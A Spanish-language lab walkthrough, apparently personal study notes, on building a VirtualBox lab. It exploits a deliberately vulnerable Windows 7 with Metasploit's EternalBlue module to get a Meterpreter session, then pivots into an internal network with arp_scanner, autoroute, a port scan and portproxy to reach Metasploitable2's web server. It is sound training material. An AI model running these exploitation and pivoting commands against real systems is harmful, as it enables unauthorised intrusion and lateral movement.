Maquinas que vamos a utilizar **Kali Linux , Windows 7 Vulnerable y Metasploitable2**

  

[https://drive.google.com/file/d/11oWEHwqu9AOKNwBU483abdGhnxJaZKT5/view?usp=sharing](https://drive.google.com/file/d/11oWEHwqu9AOKNwBU483abdGhnxJaZKT5/view?usp=sharing)

[Metasploitable2https://sourceforge.net/projects/metasploitable/files/Metasploitable2](https://sourceforge.net/projects/metasploitable/files/Metasploitable2)

  

### **Mapa de la Red que vamos a utilizar**

![[Imagenes/image 62.png|image 62.png]]

  

- Configuramos las redes en VirtualBox **Archivos → Herramientas → Administrador de red.**
    
    - Tenemos que tener creadas dos redes.
        
        1. Red **Pedro → 10.0.3.0/24**
            
            ![[Imagenes/image 1 51.png|image 1 51.png]]
            
        
          
        
        1. Red **Red_Pivoting → 10.10.10.0/24**
            
            ![[Imagenes/image 2 50.png|image 2 50.png]]
            
    
      
    
    - Los adaptadores de red de las maquinas quedarían asi.
        1. Maquina Kali quedaría así:
            
            ![[Imagenes/image 3 49.png|image 3 49.png]]
            
            En la Kali Linux me tendría que aparecer una IP dentro del rango de red que le había asignado. Lo veriamos con `ifconfig`.
            
            ![[Imagenes/image 4 46.png|image 4 46.png]]
            
              
            
        2. Maquina Windows 7
            
            ![[Imagenes/image 5 45.png|image 5 45.png]]
            
            ![[Imagenes/image 6 42.png|image 6 42.png]]
            
            Al hacer un `ipconfig` nos quedaría mas o menos así con dos IP en distintos adaptadores de red.
            
            ![[Imagenes/image 7 40.png|image 7 40.png]]
            
              
            
        3. Maquina Metasploitable2
            
            ![[Imagenes/image 8 38.png|image 8 38.png]]
            
            Usamos el usuario y contraseña para entrar **usuario/pass: msfadmin** y hacemos un `ifconfig`.
            
            ![[Imagenes/image 9 35.png|image 9 35.png]]
            

  

---

  

Comenzamos. Vamos a hacer el proceso completo , haremos una intrusión a la maquina con Windows 7 y luego el **Pivoting** a la metasplitable2.

  

```Bash
sudo arp-scan -I eth0 --localnet
```

![[Imagenes/image 10 31.png|image 10 31.png]]

  

![[Imagenes/image 11 25.png|image 11 25.png]]

- Ejecutamos el Metasploit
    
    ![[Imagenes/image 12 25.png|image 12 25.png]]
    

  

- Vamos a explotar un EternalBlue
    
    `search eternalblue`
    
    ![[Imagenes/image 13 23.png|image 13 23.png]]
    

`use 0`

![[Imagenes/image 14 21.png|image 14 21.png]]

  

`show options`

![[Imagenes/image 15 18.png|image 15 18.png]]

- Rellenamos los datos que necesitemos y ejecutamos el exploit.
    
    `set RHOST 10.0.3.6`
    
    `run`
    
    ![[Imagenes/image 16 15.png|image 16 15.png]]
    
    ![[Imagenes/image 17 12.png|image 17 12.png]]
    
    Ya tenemos una sesión de Meterpreter
    
      
    

> [!important] Importante para hacer **Pivoting** hay que hacerlo **todo desde el meterpreter.**

  

- `ipconfig`
    
    ![[Imagenes/image 18 10.png|image 18 10.png]]
    
    Vemos que **tenemos dos IPs distintas** que pertenecen a **dos interfaces** distintas.
    
    `10.0.3.6`
    
    `10.10.10.4` → **Aquí debo hacer el Pivoting.**
    
    ![[Imagenes/image 19 7.png|image 19 7.png]]
    

  

---

  

  

- **Dejamos** la sesión **en Background** y comprobamos que se a quedado en segundo plano y el ID de sesión que mas tarde necesitaremos.
    
    `CTRL+Z`
    
    `sessions -l`
    
    ![[Imagenes/image 20 7.png|image 20 7.png]]
    
      
    
- Vamos a utilizar un modulo de metasploit que sirve para **encontrar equipos dentro de la red interna**.
    
    `use windows/gather/arp_scanner`
    
    ![[Imagenes/image 21 6.png|image 21 6.png]]
    

  

- Miramos las opciones y rellenamos las que necesitemos.
    
    `show options`
    
    ![[Imagenes/image 22 6.png|image 22 6.png]]
    
      
    
    `set RHOSTS 10.10.10.4/24`
    
    > [!important] Como vemos hemos puesto la **IP nueva** que habíamos encontrado y le hemos añadido **/24**. Esto lo hacemos para que al hacer la búsqueda abarque **todo el ranco de red** de esa IP.
    

`set SESSION 1`

`show options`

![[Imagenes/image 23 6.png|image 23 6.png]]

`run`

![[Imagenes/image 24 5.png|image 24 5.png]]

Ya hemos encontrado la IP de la maquina victima. Ahora **hay que enrutar el trafico** para que envié el trafico de la maquina final a mi maquina Kali.

![[Imagenes/image 25 5.png|image 25 5.png]]

  

- Usamos el modulo autorute para **enrutar el trafico**. Miramos las opciones y completamos las que necesitemos.
    
    `use multi/manage/autoroute`
    
    ![[Imagenes/image 26 3.png|image 26 3.png]]
    
      
    
    `show options`
    
    `set SESSION 1`
    
    `show options`
    
    ![[Imagenes/image 27 3.png|image 27 3.png]]
    

`run`

![[Imagenes/image 28 3.png|image 28 3.png]]

Ya tenemos el trafico enrutado

![[Imagenes/image 29 3.png|image 29 3.png]]

  

- Hacemos un **escaneo de puertos abierto de la maquina Victima.** Seria como hacer un nmap pero desde metasploit.
    
    `use scanner/portscan/tcp`
    
    `show options`
    
    ![[Imagenes/image 30 3.png|image 30 3.png]]
    
    > [!important] **OJO**, **con** `**PORTS**` esta puesto **escaneo hasta** el puerto **10000** , en caso de necesitar a puerto superiores tendríamos que cambiarlo.
    

`set RHOSTS 10.10.10.5`

![[Imagenes/image 31 2.png|image 31 2.png]]

  

`run`

![[Imagenes/image 32 2.png|image 32 2.png]]

**Esperamos a que acabe** y en nuestro caso voy a **enumerar el puerto 80** que esta abierto.

  

- Como estamos haciendo el **pivoting en Windows usamos el siguiente modulo.**
    
    `use post/windows/manage/portproxy`
    
    `show options`
    
    ![[Imagenes/image 33 2.png|image 33 2.png]]
    
      
    
- Rellenamos los apartados que necesitamos.
    
    CONNECT_ADDRESS → **IP** de la **maquina victima**
    
    CONNECT_PORT → **Puerto** que voy **a atacar** en mi caso el 80
    
    LOCAL_ADDRESS → Poner s**iempre 0.0.0.0**
    
    LOCAL_PORT → Donde nos queramos **traer el puerto que estamos atacando**.
    
    SESSION → **ID** de la **sesión abierta**
    

`set CONNECT_ADDRESS 10.10.10.5`

`set CONNECT_PORT 80`

`set LOCAL_ADDRESS 0.0.0.0`

`set LOCAL_PORT 5000`

`set SESSION 1`

`show options`

![[Imagenes/image 34 2.png|image 34 2.png]]

`run`

![[Imagenes/image 35 2.png|image 35 2.png]]

Ya tendríamos la conexión sobre el puerto 80 de la maquina Meterpreter.

  

- Vamos a **acceder al puerto 80** de la maquina metasploitable2.
    - Abrimos el **navegador web** de la maquina Kali Linux ponemos la **IP de la maquina que esta en medio ,** en nuestro caso la de Windows 7 y el **puerto** que hemos **elegido enrutar** en este caso el 5000. `10.0.3.6:5000`
        
        ![[Imagenes/image 36 2.png|image 36 2.png]]